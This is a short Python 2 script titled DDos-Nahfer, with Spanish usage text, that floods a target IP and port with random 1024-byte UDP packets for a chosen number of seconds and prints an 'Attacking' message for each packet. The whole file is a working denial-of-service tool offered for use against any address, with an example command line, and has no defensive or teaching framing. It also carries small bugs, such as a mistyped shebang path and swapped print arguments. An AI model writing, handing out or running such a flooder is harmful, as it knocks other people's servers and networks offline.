#!/use/bin/python2
#creado por capitan comando
import time
import socket
import random
import sys
import os
def usage():
    os.system("figlet DDos-Nahfer")
    print "	  Creador por: Capitan Comando"
    print '''
    Uso:
    
     python2 DDos-Nahfer.py <ip> <puerto> <Cantidad>
  
ejemplo:

     python2 DDos-Nahfer.py 130.0.0.0 80 3000

'''

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking  %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

